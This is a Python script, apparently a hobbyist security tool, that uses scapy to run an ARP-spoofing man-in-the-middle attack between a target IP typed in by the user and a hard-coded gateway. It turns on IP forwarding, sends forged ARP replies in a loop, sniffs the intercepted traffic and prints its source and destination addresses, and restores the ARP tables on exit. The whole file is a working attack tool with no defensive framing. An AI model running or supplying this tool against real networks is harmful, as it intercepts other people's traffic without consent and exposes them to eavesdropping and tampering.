import scapy.all as scapy
import sys, os, re, time


def get_MAC_address(ip):
    req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    req_broadcast = broadcast / req
    answered_list = scapy.srp(req_broadcast, timeout=1, verbose=False)[0]
    try:
        return answered_list[0][1].hwsrc

    except Exception as e:
        print(e)
        print("[-] Error: Could not get MAC address")
        return None


def spoof(target_ip, spoof_ip):
    target_mac = get_MAC_address(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_MAC_address(destination_ip)
    source_mac = get_MAC_address(source_ip)
    packet = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    scapy.send(packet, count=4, verbose=False)


# target_ip = "10.51.81.223" # Enter your target IP
target_ip = input("Enter your target IP: ")
# test to see if its a valid ip using regex
while True:
    if re.search(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", target_ip):
        break
    else:
        print("Invalid IP")
        target_ip = input("Enter your target IP: ")


gateway_ip = "10.51.1.1"  # Enter your gateway's IP


# ip foward toggle
def ip_forward(on=True):
    if sys.platform == "darwin":
        os.system(f"sysctl -w net.inet.ip.forwarding={'1' if on else '0'}")
    if "linux" in sys.platform:
        os.system(f"echo {'1' if on else '0'} > /proc/sys/net/ipv4/ip_forward")


def callBackParser(packet):
    if scapy.IP in packet:
        source_ip = packet[scapy.IP].src
        destination_ip = packet[scapy.IP].dst
        print("From : " + str(source_ip) + " to -> " + str(destination_ip))


try:
    sent_packets_count = 0
    ip_forward(True)
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        scapy.sniff(prn=callBackParser, store=False, iface="en0", count=10)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent " + str(sent_packets_count), end="")
        time.sleep(2)  # Waits for two seconds

except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    ip_forward(False)
    print("[+] Arp Spoof Stopped")
